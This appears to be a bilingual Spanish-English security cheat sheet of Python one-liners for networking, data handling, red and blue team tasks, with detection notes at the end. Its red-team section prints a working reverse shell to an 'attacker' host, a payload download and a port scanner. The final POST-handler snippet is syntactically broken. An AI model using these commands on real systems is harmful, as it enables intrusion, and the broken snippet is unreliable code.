---
title: Python One-liners
phase: oneliners
platform: multi
tags: [python, scripting, one-liner, automation]
risk: medium
attack_tactic: NA
attack_technique: NA
data_sources: []
last_review: 2026-05-25
---

# Python One-liners

### Objetivo

Tareas rápidas de processing, networking, y automation usando Python desde command line.

### Networking

```bash
# Simple HTTP server (py http.server)
python -m http.server 8080

# Base64 encode/decode
python -c "import base64; print(base64.b64encode(b'data'))"
python -c "import base64; print(base64.b64decode(b'ZGF0YQ=='))"

# URL encode
python -c "import urllib.parse; print(urllib.parse.quote('test with spaces'))"

# Simple TCP client
python -c "import socket; s=socket.socket(); s.connect(('target',80)); s.send(b'HEAD / HTTP/1.0\r\n\r\n'); print(s.recv(1024)); s.close()"
```

### Data Processing

```bash
# JSON pretty print
python -m json.tool data.json

# CSV to JSON
python -c "import csv,json,sys; print(json.dumps(list(csv.DictReader(sys.stdin))))" < file.csv

# Read file lines reversed
python -c "print(open('file.txt').readlines()[::-1])"

# Hash calculation
python -c "import hashlib; print(hashlib.sha256(open('file','rb').read()).hexdigest())"
```

### Red Team One-liners

```bash
# Simple reverse shell
python -c "import socket,subprocess,os; s=socket.socket(); s.connect(('attacker',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/bash','-i'])"

# File download
python -c "import urllib.request; urllib.request.urlretrieve('http://attacker/file','out')"

# Port scanner (simple)
python -c "import socket; [socket.socket().connect(('target',p)) or print(p) for p in range(1,1000) if not socket.socket().connect_ex(('target',p))]"
```

### Automation

```bash
# Cron script generator
python -c "
import sys
[print(f'0 {h} * * * /scripts/backup.sh') for h in range(24)]
"

# Generate wordlist
python -c "import itertools; [print(''.join(p)) for p in itertools.product('0123456789', repeat=4)]"
```

### Blue Team One-liners

```bash
# Parse log, extract IPs, count
python -c "
import re
logs = open('access.log').read()
ips = re.findall(r'\d+\.\d+\.\d+\.\d+', logs)
print({ip:ips.count(ip) for ip in set(ips)})
"

# Extract IOCs from text
python -c "
import re, sys
text = sys.stdin.read()
print('Domains:', re.findall(r'[a-z0-9]+\.[a-z]+\.[a-z]+', text))
print('IPs:', re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text))
"
```

### One-liners

```bash
# HTTP server with POST handler
python -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
  def do_POST(self): open('output.bin','ab').write(self.rfile.read(int(self.headers['Content-Length'])) if self.path=='/' else self.send_error(404)
HTTPServer(('0.0.0.0',8080)&H).serve_forever()
"
```

### Detección y Mitigación

- **Visibilidad:** Python spawning network connections from workstation is high-fidelity indicator.
- **Hardening:** Restringir Python network access via EDR, application whitelisting.

### Validación de Cobertura

- **Prueba técnica:** Simular reverse shell Python in lab.
- **Criterio de éxito:** EDR alerts on network connection from Python.
